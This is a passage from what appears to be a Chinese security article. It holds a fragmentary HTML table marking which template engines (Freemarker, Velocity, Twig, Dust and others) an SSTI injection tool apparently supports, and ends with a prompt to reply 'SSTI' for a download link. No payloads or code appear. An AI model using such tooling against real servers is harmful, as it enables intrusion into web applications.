#dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">PHP</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Freemarker</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Java</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Velocity</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Java</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Twig (&gt;1.19)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Dust (&gt; </span><span style="text-align:left;line-height:1.75;color:#576b95;"><span leaf="">dustjs-helpers@1.5.0</span></span><span leaf="">)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">×</span></section></td></tr></tbody></table>  
## 获取工具  
  
后台回复【SSTI】获取工具下载链接。  
  
  
  
